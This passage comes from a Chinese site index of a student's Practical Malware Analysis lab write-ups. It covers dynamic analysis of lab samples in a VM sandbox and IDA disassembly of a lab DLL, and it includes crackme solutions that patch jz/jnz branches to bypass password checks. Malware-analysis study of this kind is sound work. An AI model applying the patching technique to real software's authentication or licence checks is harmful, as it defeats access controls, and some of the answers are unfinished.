提取出来了。\n"},{"id":127,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/03/lab3-1/","title":"Lab3 1","section":"03","content":"lab 3-1 #  QUESTION 1 #   What are this malware’s imports and strings?\n 通过 PEiD 这个软件分析这个病毒：\n发现这个病毒使用了 PEncrypt 3.1 加壳了。所以我们并不知道它实际的导入函数。\n于是我们通过 strings 命令分析里面的可见字符串：\n$ strings Lab03-01.exe !This program cannot be run in DOS mode. Rich .text `.data ExitProcess kernel32.dll ws2_32 # ... CONNECT %s:%i HTTP/1.0 # ... QQVP advpack StubPath SOFTWARE\\Classes\\http\\shell\\open\\commandV Software\\Microsoft\\Active Setup\\Installed Components\\ test www.practicalmalwareanalysis.com admin VideoDriver WinVMX32- vmx32to64.exe SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders AppData V%X_ 可见加壳后还有一些注册表位置、域名等字符串。\nQUESTION 2 #   What are the malware’s host-based indicators?\n 下面将通过动态技术分析这个病毒的网络状态，因此我们需要将虚拟机的网络设置为主机模式：\n在主机中扫描局域网，可以看到虚拟机的网络号：\n$ nmap -sP 192.168.122.0/24 Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-03 13:57 ?D1ú±ê×?ê±?? Nmap scan report for 192.168.122.254 Host is up (0.00s latency). MAC Address: 00:50:56:E8:EC:7F (VMware) Nmap scan report for 192.168.122.1 Host is up. Nmap done: 256 IP addresses (2 hosts up) scanned in 12.31 seconds 先使用 Process Explorer 这个工具分析这个病毒。分析这个病毒导入的 dll 中，我们发现了与网络相关的动态链接库 mswsock.dll：\n我们恢复虚拟机快照，重启虚拟机再在虚拟机中打开 Procmon，添加 Process Name - is - lab03-01.exe 的过滤器，然后运行这个病毒，我们可以在 Procmon 中检测到病毒的行为特征：\n可见在 Operation 一栏中，在 Procmon 记录了从 Process Start 开始病毒调用的所有 API 函数。分析这一栏调用的 API 函数，发现这个病毒大量地调用了 CreateFile 函数和 RegOpenKey 这两个 API 函数。并没有发现与网络请求相关的函数调用。\n所以被感染的主机会有以上分析出的不寻常文件的创建、以上注册表项的更改、可能与 www.practicalmalwareanalysis.com 建立了连接这些特征。\nQUESTION 3 #   Are there any useful network-based signatures for this malware? If so, what are they?\n ApateDNS #  为了分析这个病毒的网络请求，使用 ApateDNS 这个工具，可以用于劫持本地的所有 DNS 请求，下载以及介绍地址。\n但是这个工具似乎并不可以在 Windows XP 虚拟机上运行（年代久远的系统还有很多网络不兼容的问题），于是我在南开大学正版软件上下载了 Windows 7 的镜像。然后在虚拟机上运行 ApateDNS 劫持本地的所有 DNS 请求，打开浏览器测试：\n但是这个病毒竟然无法在 Windows 7 上运行。\n于是我决定同时打开 Windows XP 和 Windows 7 系统，使用 vmware 中的 NAT 中，使得两个虚拟机位于同一局域网中，关闭 Windows 7 的防火墙，让 Windows XP 的 DNS 流量流向 Windos 7。同时，为了处理病毒可能会请求的 HTTP 流量，我们打开 Kali Linux，也用同样的方式至于局域网中。我们先通过 nmap \u0026amp; ipconfig 查看 DHCP 服务器分配给三个虚拟机的 IP：\n$ nmap -sP 192.168.32.0/24 Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-05 08:55 ?D1ú±ê×?ê±?? Nmap scan report for 192.168.32.128 # ===\u0026gt; Windows XP (病毒) Host is up (0.0010s latency). MAC Address: 00:0C:29:07:DB:FB (VMware) Nmap scan report for 192.168.32.129 # ===\u0026gt; Windows 7 (DNS 服务器) Host is up (0.0050s latency). MAC Address: 00:0C:29:62:3E:4E (VMware) Nmap scan report for 192.168.32.130 Host is up (0.0010s latency). # ===\u0026gt; Kali Linux (WEB 服务器) MAC Address: 00:0C:29:62:3E:4E (VMware) Nmap scan report for 192.168.32.254 Host is up (0.00s latency). MAC Address: 00:50:56:F6:6C:A8 (VMware) Nmap scan report for 192.168.32.1 # ===\u0026gt; 主机 Host is up. Nmap done: 256 IP addresses (4 hosts up) scanned in 9.63 seconds 这其中 192.168.32.128 是 Windows XP 的局域网 IP、192.168.32.129 是 Windows 7 的局域网 IP。我们保持 Windows 7 的 ApateDNS 处于运行状态，并且设置 Windows XP 的 DNS 地址：\n使用 nslookup 以确定我们已经正确地设置了 DNS 地址：\n$ nslookup www.baidu.com Server: 129.32.168.192.in-addr.arpa Address: 192.168.32.129 Non-authoritative answer: Name: www.baidu.com.localdomain Address: 127.0.0.1 很显然这个 127.0.0.1 的应答是我们的 Win7 系统给出的。为了避免病毒直接通过 IP 访问，我们简单地把主机的网络切断。至此我们已经设置好了 DNS 的环境，于是我们可以愉快地分析病毒了。\n运行病毒，我们再 Windows 7 上发现，这个病毒尝试解析 www.practicalmalwareanalysis.com 这个域名：\nPython HTTP\u0026amp;HTTPS #  接着我们在 Kali Linux 搭建一个简单的 WEB 服务器：\n$ iptables -A INPUT -p tcp --dport 80 -j ACCEPT $ iptables-save $ mkdir /var/www/malware $ cd /var/www/malware $ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 然后我们呢在 Win7 中，把 DNS 解析的结果指向 Kali，然后再在 XP 中运行病毒：我们发现 Win7 中有 DNS 的解析结果，但是 Kali 中却没有来自病毒的访问记录。\n于是开始怀疑病毒访问的不是标准端口，因为 Kali 是默认安装了 wireshark 的，我们使用下面的过滤器直接使用 wireshark 抓包：\nip.addr == 192.168.32.128 如上图，我们发现它竟然访问的是 443 端口，于是我们先尝试把 HTTP 服务部署在 443 端口：\n发现这个病毒是真实使用的 HTTPS 服务进行访问。我们再搭建一个简单的 HTTPS 服务：\n$ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 $ cat \u0026lt;\u0026lt; _EOF_ \u0026gt; httpsserver.py from http.server import HTTPServer, BaseHTTPRequestHandler import ssl httpd = HTTPServer((\u0026#39;localhost\u0026#39;, 4443), BaseHTTPRequestHandler) httpd.socket = ssl.wrap_socket (httpd.socket, keyfile=\u0026#34;./key.pem\u0026#34;, certfile=\u0026#39;path/to/cert.pem\u0026#39;, server_side=True) httpd.serve_forever() _EOF_ $ python3 httpsserver.py 再用 wireshark 抓包，发现服务器拒绝了病毒的连接申请：\n这说明病毒访问的根本不是真正的 HTTPS 服务，但是 HTTP 同样也无法处理这个请求。\nINetSim #  我们也可以用 INetSim 这个工具在 Kali Linux 中部署一个 WEB 服务（这个工具在 Kali 是默认安装的）。因为这个工具默认开启在本地端口，因此需要更改 /etc/inetsim/inetsim.conf 这个配置文件，加入下面的配置：\nservice_bind_address = 0.0.0.0\r然后运行以下命令：\n$ inetsim 在日志文件 /usr/share/inetsim/log/service.log 中可以查看访问的所有访问的日志记录。\n结论 #  病毒运行之后首先会请求解析 www.practicalmalwareanalysis.com 的 IP，与目标主机建立了 TCP 连接之后，以一个非 HTTPS \u0026amp; HTTP 协议访问目标服务器的 443 端口。\n"},{"id":128,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/03/lab3-2/","title":"Lab3 2","section":"03","content":"lab 3-2 #  QUESTION 1 #   How can you get this malware to install itself?\n 首先查看文件类型：\n$ file Lab03-02.dll Lab03-02.dll: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows 因此使用程序 rundll32.exe 安装动态链接库，msdn 使用教程。\n我们进一步查看这个动态链接库的导出内容，以查看应该运行哪个函数安装：\n因此从名字来判断，有可能是 Install 也有可能是 installA，我们发现前者运行不了，因此安装这个动态链接库的指令为：\n$ rundll32.exe Lab03-02.dll, installA QUESTION 2 #  regmon #  恢复虚拟机快照到运行动态链接库之前，打开 Regmon，过滤 rundll32.exe 这个可执行文件，再高亮调用的 CreateKey 这个函数，再运行上面安装动态链接库的命令，我们得到以下的结果：\n可见这个动态链接库通过 rundll32.exe 创建了一个名为 IPRIP 的服务。\nregedit #  我们也可以通过 regedit 观察这个注册表的内容（可以看到其名称为 Intranet Network Awareness (INA+)）：\nmsconfig #  另外也可以用 msconfig 命令查看所有安装的服务（可见这个服务还尝试将自己的制作商伪装为微软官方）：\n启动 #  可以用以下的命令启动这个服务：\n$ net start IPRIP Intranet Network Awareness (INA+) 服务正在启动 . Intranet Network Awareness (INA+) 服务已经启动成功。 QUESTION 3 #   How can you find the process under which this malware is running?\n 运行起服务之后，可以用 tasklist 命令查看运行期程序的 PID：\n可见这是 svchost.exe 这个程序再运行这个服务，其 PID 是 1060。另外，可以用 procexp 这个软件搜索调用 Lab03-02.dll 的应用程序：\n也可以见到调用这个动态链接库的是 PID 为 1060 的程序 svchost.exe。\nQUESTION 4 #   Which filters could you set in order to use procmon to glean information?\n 通过 PID is 1060 过滤 PID：\n因为这过滤的是 svchost.exe 这个进程，这个进程是用于管理服务的；同时根据第三问的查看，用这种方法过滤会选出其他的服务。\nQUESTION 5 #   What are the malware’s host-based indicators?\n 根据前面的观察，主要会有以下的特征：\n 安装了一个服务 Intranet Network Awareness (INA+)，其制造商被伪造为 Microsoft Corporation； 上面的服务被安装在了注册表中名为 IPRIP 表项服务，这个表项中还有动态链接库的位置； 在运行时查看调用的动态链接库是否有 Lab03-02.dll  QUESTION 6 #   Are there any useful network-based signatures for this malware?\n 对于网络连接，我们像 3-1 一样搭建一个网络分析环境，先打开 Win7 运行一个 DNS 服务，并将 DNS 解析结果全部指向 Kali Linux，并在 Kali Linux 上运行一个 INetSim 服务。\n首先，我们在 Win7 的 DNS 服务器中看到病毒启动后请求解析 practicalmalwareanalysis.com 这个域名：\n我们将这个域名解析到 Kali Linux 上后，可以通过以下的方式查看来自 XP 的访问 practicalmalwareanalysis.com 的访问记录：\n$ cat /usr/share/inetsim/log/service.log | grep 128 | grep malware [2019-05-11 07:25:58] [3067] [http_80_tcp 3860] [192.168.32.128:1038] recv: Host: practicalmalwareanalysis.com [2019-05-11 07:25:58] [3067] [http_80_tcp 3860] [192.168.32.128:1038] info: Request URL: http://practicalmalwareanalysis.com/serve.html [2019-05-11 07:25:58] [3067] [http_80_tcp 3860] [192.168.32.128:1038] stat: 1 method=GET url=http://practicalmalwareanalysis.com/serve.html sent=/usr/share/inetsim/data/http/fakefiles/sample.html postdata= 可见这个服务通过 80 端口访问了 http://practicalmalwareanalysis.com/serve.html 这个地址。\n"},{"id":129,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/03/lab3-3/","title":"Lab3 3","section":"03","content":"lab 3-3 #  QUESTION 1 #   What do you notice when monitoring this malware with Process Explorer?\n 拿到病毒首先分析是否加壳：\n可见其 packer 就是 Visual C++ 6.0，没有进行任何加壳，理论上可以直接分析反汇编代码，但是题目让我们进行动态分析，于是我们再虚拟机中运行这个病毒。\n我们首先打开 Procexp 与 Procmon，然后运行 Lab03-03.exe 这个程序：\n我们发现 Lab03-03.exe 这个应程序再运行时创建了一个 svchost.exe 的子进程。\n另外我们尝试通过 procmon 中过滤 Process Name =is= Lab03-03.exe 进程观察这个进程调用的 API。我们发现这个病毒尝试创建这样一个敏感文件 C:/Windows/System32/svchost.exe：\n我们猜测这个病毒可能尝试替换电脑中的 svchost.exe 文件，并且替换电脑的服务进程。\nQUESTION 2 #   Can you identify any live memory modifications?\n 同样的我们再 procmon 中添加以下的两条过滤条件：\n\u0026#34;Process Name\u0026#34; is \u0026#34;Lab03-03.exe\u0026#34; \u0026#34;Operations\u0026#34; contains \u0026#34;Create\u0026#34; 通过上面的分析，这个恶意代码主要尝试创建以下的几个文件：svchost.exe、apphelp.dll、systest.db 等，其中大部分文件由于权限问题创建失败，因此我们也有理由相信它因为权限问题无法写入文件。\n所以大致猜测，该恶意代码尝试替换主机上的 svchost.exe 文件，但因为权限问题无法写入。但是通过第一问的分析，恶意代码可能已经替换了正运行在内存中的 svchost.exe 文件。\n另外进一步观察这里调用的 API，发现这个病毒还在同级目录下创建了文件 practicalmalwareanalysis.log，这个文件。\nQUESTION 3 #   What are the malware’s host-based indicators?\n 如同前面两节搭建网络测试环境：Windows XP 运行病毒、Windows 7 搭建 DNS 服务、Kali Linux 搭建 WEB、SSH 等应用层服务。\n运行病毒后，我们并没有再 Windows 7 上看到来自 Windows XP 的任何 DNS 请求，再在 Kali Linux 上再使用 wireshark 捕获整个网卡上的所有流量信息，并没有任何相关信息。\n因此综上所述，可以唯一观察到的主机迹象是创建了同目录下的文件 practicalmalwareanalysis.log。\nQUESTION 4 #   What is the purpose of this program?\n 经过前面的分析，这个程序主要替换了一个 svchost.exe 文件。但是并没有发起任何网络请求，另外还在同级目录下的文件 practicalmalwareanalysis.log 中记录了一些东西：\n[Window: C:\\Documents and Settings\\Administrator\\桌面\\Practical Malware Analysis Labs\\BinaryCollection\\Cha]\r[Window: practicalmalwareanalysis.log 属性]\rc\r[Window: C:\\Documents and Settings\\Administrator\\桌面\\Practical Malware Analysis Labs\\BinaryCollection\\Cha]\r[Window: C:\\Documents and Settings\\Administrator\\桌面\\Practical Malware Analysis Labs\\BinaryCollection\\Chapter_3L\\practicalmalwareanalysis.log - EverEdit]\rac\r暂时还不知道这个记录的内容是什么。\n"},{"id":130,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/03/lab3-4/","title":"Lab3 4","section":"03","content":"lab 3-4 #  QUESTION 1 #   What happens when you run this file?\n 拿到病毒首先分析是否加壳：\n同样的这个文件也是 Microsoft Visual C++ 6.0，同样理论上也可以直接分析反汇编代码。对于本题我们只需要双击运行即可。\n双击运行结果：病毒闪退，然后把自己删掉了。\nQUESTION 2 #   What is causing the roadblock in dynamic analysis?\n 这个病毒会检测自己是否被正确执行，然后闪退把自己删除。\nQUESTION 3 #   Are there other ways to run this program?\n 分析反汇编代码应该可以观察这个程序需要什么手段才可以正确执行，但是我懒，不想继续分析了。\n"},{"id":131,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/04/lab4-1/","title":"Lab4 1","section":"04","content":"lab 4-1 #  用 IDA pro 打开文件：\nint __cdecl main_0(int argc, const char **argv) { int result; // eax  if ( argc == 2 ) { if ( !j_strcmp(argv[1], \u0026#34;topsecret\u0026#34;) ) printf(\u0026#34;You found the password! Congratulations!\\n\u0026#34;); else printf(\u0026#34;Fail!\\n\u0026#34;); result = 0; } else { printf(\u0026#34;Usage: crackme-123-1 password\\n\u0026#34;); result = 1; } return result; } .text:004113C2 push offset Str2 ; \u0026#34;topsecret\u0026#34; .text:004113C7 mov eax, [ebp+arg_4] .text:004113CA mov ecx, [eax+4] .text:004113CD push ecx ; Str1 .text:004113CE call j_strcmp .text:004113D3 add esp, 8 .text:004113D6 test eax, eax .text:004113D8 jnz short loc_4113F5 .text:004113DA mov esi, esp .text:004113DC push offset aYouFoundThePas ; \u0026#34;You found the password! Congratulation\u0026#34;... .text:004113E1 call ds:printf .text:004113E7 add esp, 4 .text:004113EA cmp esi, esp .text:004113EC call j___RTC_CheckEsp .text:004113F1 xor eax, eax .text:004113F3 jmp short loc_41140E 通过查看汇编代码，发现只要将第8行的 jnz short loc_4113F5 改为 jz short loc_4113F5 即把判断条件反转即可做到输入随机字符串可通过认证。\n"},{"id":132,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/04/lab4-2/","title":"Lab4 2","section":"04","content":"Lab 4-2 #  用 IDA pro 打开文件，分析伪代码：\nint __cdecl main_0(int argc, const char **argv) { int result; // eax  if ( argc == 2 ) { if ( !j_strcmp(argv[1], \u0026#34;alligator\u0026#34;) ) printf(\u0026#34;You found the password! Congratulations!\\n\u0026#34;); else printf(\u0026#34;Fail!\\n\u0026#34;); result = 0; } else { printf(\u0026#34;Usage: crackme-123-2 password\\n\u0026#34;); result = 1; } return result; } 发现与前一个一样，所以同样修改对应的汇编即可。\n"},{"id":133,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/04/lab4-3/","title":"Lab4 3","section":"04","content":"Lab 4-3 #  还是用 IDA pro 分析，得到伪代码：\nsigned int __cdecl main_0(int a1, int a2) { signed int result; // eax  if ( a1 == 3 ) { if ( !j_strcmp(*(const char **)(a2 + 4), \u0026#34;suffering\u0026#34;) ) { if ( !j_strcmp(*(const char **)(a2 + 8), \u0026#34;succotash\u0026#34;) ) printf(\u0026#34;Congratulations! You found the passwords!\\n\u0026#34;); else printf(\u0026#34;Fail! Second word was wrong!\\n\u0026#34;); result = 0; } else { printf(\u0026#34;Fail! First word was wrong!\\n\u0026#34;); result = 0; } } else { printf(\u0026#34;Usage: crackme-123-3 password1 password2\\n\u0026#34;); result = 1; } return result; } 这个是要输入两个密码的，就改两个条件判断就可以了。\n.text:004113D2 push offset Str2 ; \u0026#34;suffering\u0026#34; .text:004113D7 mov eax, [ebp+arg_4] .text:004113DA mov ecx, [eax+4] .text:004113DD push ecx ; Str1 .text:004113DE call j_strcmp .text:004113E3 add esp, 8 .text:004113E6 test eax, eax .text:004113E8 jz short loc_411405 .text:004113EA mov esi, esp .text:004113EC push offset aFailFirstWordW ; \u0026#34;Fail! First word was wrong!\\n\u0026#34; .text:004113F1 call ds:printf .text:004113F7 add esp, 4 .text:004113FA cmp esi, esp .text:004113FC call j___RTC_CheckEsp .text:00411401 xor eax, eax .text:00411403 jmp short loc_411451 .text:00411405 loc_411405: ; CODE XREF: _main_0+58↑j .text:00411405 push offset aSuccotash ; \u0026#34;succotash\u0026#34; .text:0041140A mov eax, [ebp+arg_4] .text:0041140D mov ecx, [eax+8] .text:00411410 push ecx ; Str1 .text:00411411 call j_strcmp .text:00411416 add esp, 8 .text:00411419 test eax, eax .text:0041141B jz short loc_411438 将第 8 行和第 26 行的 jz 命令改为 jnz 即可。\n"},{"id":134,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/04/lab4-4/","title":"Lab4 4","section":"04","content":"Lab 4-4 #  又是用 IDA pro 分析文件，得到：\nsigned int __cdecl main_0(int a1, const char **a2) { signed int result; // eax  if ( a1 == 2 ) { if ( !j_strcmp(*a2, \u0026#34;game3.exe\u0026#34;) ) { if ( !j_strcmp(a2[1], \u0026#34;dromedary\u0026#34;) ) printf(\u0026#34;Congratulations! You solved the crackme puzzle!\\n\u0026#34;); else printf(\u0026#34;Incorrect password!\\n\u0026#34;); result = 0; } else { printf(\u0026#34;Fail!\\n\u0026#34;); result = 0; } } else { printf(\u0026#34;Usage: game3.exe password\\n\u0026#34;); result = 1; } return result; } 这里可以看出首先需要将文件名改为 game3.exe 然后再进行输入 game3.exe dromedary\n当然也可以通过更改对应汇编代码的形式实现随机输入的认证。\n这里要注意的问题是：改完文件名之后，运行文件的命令行界面用 cmd 界面，不要使用 ./ 命令，因为使用 ./ 命令后传入的字符串为文件的绝对地址，会导致 strcmp 函数的返回非0\n"},{"id":135,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/05/lab5-1/","title":"Lab5 1","section":"05","content":"lab 5-1 #  QUESTION 1 #   What is the address of DllMain?\n 我们用 Ida Pro 加载这个动态链接库，在左侧的函数窗口点击 Ctrl+F，输入函数名 DLLMain，即可搜索：\n可见其入口地址是 .text:1000D02E。\nQUESTION 2 #   Use the Imports window to browse to gethostbyname. Where is the import located?\n 同样的方法在 Import windows 中点击 Ctrl + F，双击进入后：\n.idata:100163CC ; struct hostent *__stdcall gethostbyname(const char *name)\r.idata:100163CC extrn gethostbyname:dword\r可见其地址是 .idata:100163CC\nQUESTION 3 #   How many functions call gethostbyname?\n 可以在 Ida Pro 中使用 xrefs 工具查看调用的函数，在上一题的函数定义位置右键可以选择 list cross refrence to ...：\n可见这个函数调用了 18 次。按名称排序之后可以得到一共有 9 个不同的函数\nQUESTION 4 #   Focusing on the call to gethostbyname located at 0x10001757, can you figure out which DNS request will be made?\n 在 0x10001757 处的调用即上图函数 sub_10001656 在 101 行的调用：\n.text:1000174E mov eax, off_10019040\r.text:10001753 add eax, 0Dh\r.text:10001756 push eax ; name\r.text:10001757 call ds:gethostbyname\r根据之前函数的定义的观察我们可以发现，gethostname 的参数是一个 const char *，于是我们知道这个 DNS 函数解析的是 off_10019040 这个位置的字符串：\n.data:10019040 off_10019040 dd offset aThisIsRdoPics_\r.data:10019040 ; DATA XREF: sub_10001656:loc_10001722\u0018r\r.data:10019040 ; sub_10001656+F8\u0018r ...\r.data:10019040 ; \u0026quot;[This is RDO]pics.praticalmalwareanalys\u0026quot;...\r该处存储的也是一个地址，它指向 10019040 这个位置：\n.data:10019194 aThisIsRdoPics_ db '[This is RDO]pics.praticalmalwareanalysis.com',0\r.data:10019194 ; DATA XREF: .data:off_10019040\u0018o\r可见它要解析的是 pics.praticalmalwareanalys.com\nQUESTION 5 #   How many local variables has IDA Pro recognized for the subroutine at 0x10001656?\n 在 Ida Pro 中按 g，输入地址 0x10001656 即可看到位于这个地址的子过程：\n.text:10001656\r.text:10001656 ; =============== S U B R O U T I N E =======================================\r.text:10001656\r.text:10001656\r.text:10001656 ; DWORD __stdcall sub_10001656(LPVOID lpThreadParameter)\r.text:10001656 sub_10001656 proc near ; DATA XREF: DllMain(x,x,x)+C8\u0019o\r.text:10001656\r.text:10001656 var_675 = byte ptr -675h\r.text:10001656 var_674 = dword ptr -674h\r.text:10001656 hModule = dword ptr -670h\r.text:10001656 timeout = timeval ptr -66Ch\r.text:10001656 name = sockaddr ptr -664h\r.text:10001656 var_654 = word ptr -654h\r.text:10001656 Dst = dword ptr -650h\r.text:10001656 Str1 = byte ptr -644h\r.text:10001656 var_640 = byte ptr -640h\r.text:10001656 CommandLine = byte ptr -63Fh\r.text:10001656 Str = byte ptr -63Dh\r.text:10001656 var_638 = byte ptr -638h\r.text:10001656 var_637 = byte ptr -637h\r.text:10001656 var_544 = byte ptr -544h\r.text:10001656 var_50C = dword ptr -50Ch\r.text:10001656 var_500 = byte ptr -500h\r.text:10001656 Buf2 = byte ptr -4FCh\r.text:10001656 readfds = fd_set ptr -4BCh\r.text:10001656 buf = byte ptr -3B8h\r.text:10001656 var_3B0 = dword ptr -3B0h\r.text:10001656 var_1A4 = dword ptr -1A4h\r.text:10001656 var_194 = dword ptr -194h\r.text:10001656 WSAData = WSAData ptr -190h\r.text:10001656 lpThreadParameter= dword ptr 4\r.text:10001656\r.text:10001656 sub esp, 678h\r地址小于栈帧地址的是局部变量，地址大于栈帧的是参数，因此一共有 23 个局部变量。\nQUESTION 6 #   How many parameters has IDA Pro recognized for the subroutine at 0x10001656?\n 跟第五题同样分析，有 1 个。\nQUESTION 7 #   Use the Strings window to locate the string \\cmd.exe /c in the disassembly. Where is it located?\n 在 Ida Pro 中 shift + F12 打开字符串窗口，按 Ctrl + F 搜索 \\cmd.exe /c 这个字符串：\nxdoors_d:10095B34 0000000D C \\\\cmd.exe /c 所以这个字符串位于 xdoors_d:10095B34 这个地址上。\nQUESTION 8 #   What is happening in the area of code that references \\cmd.exe /c?\n 我们首先寻找调用这个字符串的位置：\nUp o sub_1000FF58+278 push offset aCmd_exeC; \u0026quot;\\\\cmd.exe /c \u0026quot;\r可见调用的函数是 sub_1000FF58+278：\n.text:100101C8 cmp dword_1008E5C4, ebx\r.text:100101CE jz short loc_100101D7\r.text:100101D0 push offset aCmd_exeC ; \u0026quot;\\\\cmd.exe /c \u0026quot;\r.text:100101D5 jmp short loc_100101DC\r.text:100101D7 ; ---------------------------------------------------------------------------\r.text:100101D7\r.text:100101D7 loc_100101D7: ; CODE XREF: sub_1000FF58+276\u0018j\r.text:100101D7 push offset aCommand_exeC ; \u0026quot;\\\\command.exe /c \u0026quot;\r.text:100101DC\r.text:100101DC loc_100101DC: ; CODE XREF: sub_1000FF58+27D\u0018j\r.text:100101DC lea eax, [ebp+CommandLine]\r就这几行的代码看，应该是进行了一次 if 判断之后复制了一次字符串的操作。\nQUESTION 9 #   In the same area, at 0x100101C8, it looks like dword_1008E5C4 is a global variable that helps decide which path to take. How does the malware set dword_1008E5C4? (Hint: Use dword_1008E5C4’s cross-references.)\n 我们根据以下的操作：\n 双击进入这个变量存储的位置； 右键查找调用这个变量的位置，发现其中仅有一个 mov 的赋值指令； 双击进入这个位置，发现 eax 是一个函数的返回值，我们接着查看这个函数的汇编代码；  .text:100036C2 sub_10003695 endp\r.text:100036C2\r.text:100036C3\r.text:100036C3 ; =============== S U B R O U T I N E =======================================\r.text:100036C3\r.text:100036C3 ; Attributes: bp-based frame\r.text:100036C3\r.text:100036C3 sub_100036C3 proc near ; CODE XREF: sub_10001656+27\u0018p\r.text:100036C3 ; PSLIST+A\u0019p\r.text:100036C3\r.text:100036C3 VersionInformation= _OSVERSIONINFOA ptr -94h\r.text:100036C3\r.text:100036C3 push ebp\r.text:100036C4 mov ebp, esp\r.text:100036C6 sub esp, 94h\r.text:100036CC lea eax, [ebp+VersionInformation]\r.text:100036D2 mov [ebp+VersionInformation.dwOSVersionInfoSize], 94h\r.text:100036DC push eax ; lpVersionInformation\r.text:100036DD call ds:GetVersionExA\r.text:100036E3 cmp [ebp+VersionInformation.dwPlatformId], 2\r.text:100036EA jnz short loc_100036FA\r.text:100036EC cmp [ebp+VersionInformation.dwMajorVersion], 5\r.text:100036F3 jb short loc_100036FA\r.text:100036F5 push 1\r.text:100036F7 pop eax\r.text:100036F8 leave\r.text:100036F9 retn\r.text:100036FA ; ---------------------------------------------------------------------------\r大概是在比较系统的版本。\nQUESTION 10 #   A few hundred lines into the subroutine at 0x1000FF58, a series of comparisons use memcmp to compare strings. What happens if the string comparison to robotwork is successful (when memcmp returns 0)?\n F5 分析伪代码，搜索字符串 robotwork，可知若其值为 0，则会将查询注册表项 HKET_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion 中的aWorktime 和 aWorktimes ,并将其值输出。\nQUESTION 11 #   What does the export PSLIST do?\n 在 export 函数表中查找 PSLIST，分析其伪代码：\nint __stdcall PSLIST(int a1, int a2, char *Str, int a4)\r{\rint result; // eax\rdword_1008E5BC = 1;\rresult = sub_100036C3();\rif ( result )\r{\rif ( strlen(Str) )\rresult = sub_1000664C(0, Str);\relse\rresult = sub_10006518(0);\r}\rdword_1008E5BC = 0;\rreturn result;\r}\r其中 sub_100036C3 这个函数就是之前分析的判断系统版本号的函数，进一步观察 sub_1000664 的内容大概就是创建了一个给套接字创建了一个 shell。\nQUESTION 12 #   Use the graph mode to graph the cross-references from sub_10004E79. Which API functions could be called by entering this function? Based on the API functions alone, what could you rename this function?\n 我们在左侧的函数窗口中找到 sub_10004E79 这个函数，然后在 hex view 中右键点击函数名然后查看 xref greph from...，查看函数的调用图可以得到下面的信息：\n可见这个函数调用了 GetSystemDefaultLangID 这个函数，还调用了 sub_100038EE 这个函数，后者应该是一个自定义函数，根据这些信息我们猜测这个函数应该是获取系统语言的一个函数，我们将其命名为 GetSystemLanguage。\nQUESTION 13 #   How many Windows API functions does DllMain call directly? How many at a depth of 2?\n 在 Ida Pro 中依次点击：view--\u0026gt;graphs--\u0026gt;Users xrefs charts，选择函数的调用栈深为 1 即为直接调用：\n可见直接调用的函数有 7 个。\n我们可以用同样的方式将函数调用深度设置为 2，发现函数太多了，根本数不过来。\nQUESTION 14 #   At 0x10001358, there is a call to Sleep (an API function that takes one parameter containing the number of milliseconds to sleep). Looking backward through the code, how long will the program sleep if this code executes?\n 在 Ida Pro 中按 g 然后输入地址 .text:10001358：\n.text:10001357 push eax ; dwMilliseconds\r.text:10001358 call ds:Sleep\r.text:1000135E xor ebp, ebp\r.text:10001360 jmp loc_100010B4\r按 F5 查看伪代码：\n...\rv14 = atoi(off_10019020[0] + 13);\rSleep(1000 * v14);\r...\r然后对于 off_10019020 这个全局数据区的字符串：\n.data:10019020 off_10019020 dd offset aThisIsCti30 ; DATA XREF: sub_10001074:loc_10001341↑r\r.data:10019020 ; sub_10001365:loc_10001632↑r ...\r.data:10019020 ; \u0026quot;[This is CTI]30\u0026quot;\r.data:100192AC aThisIsCti30 db '[This is CTI]30',0 ; DATA XREF: .data:off_10019020↑o\r所以观察程序逻辑我们知道 v14 = 30，所以 睡眠时间等于 30 * 1000ms = 30s\nQUESTION 15 #   At 0x10001701 is a call to socket. What are the three parameters?\n 按照同样的方法，我们先跳到 0x10001701 这个地址：\n.text:100016FB push 6 ; protocol\r.text:100016FD push 1 ; type\r.text:100016FF push 2 ; af\r.text:10001701 call ds:socket\r据此我们已经知道 push 的三个内容，我们可以通过 Google 来查看它们对应的宏。\nQUESTION 16 #   Using the MSDN page for socket and the named symbolic constants functionality in IDA Pro, can you make the parameters more meaningful? What are the parameters after you apply changes?\n 15 题中的常量被定义在 winsock2.h 中，Google 以下内容 MSDN socket symbol 即可搜到 MSDN 的网址：https://docs.microsoft.com/en-us/windows/desktop/api/winsock2/nf-winsock2-socket。所以三个参数：\n   af=2 type=1 protocol=6     AF_INET（IPv4） SOCK_STREAM（流） IPPROTOCOL_TCP（TCP）    QUESTION 17 #   Search for usage of the in instruction 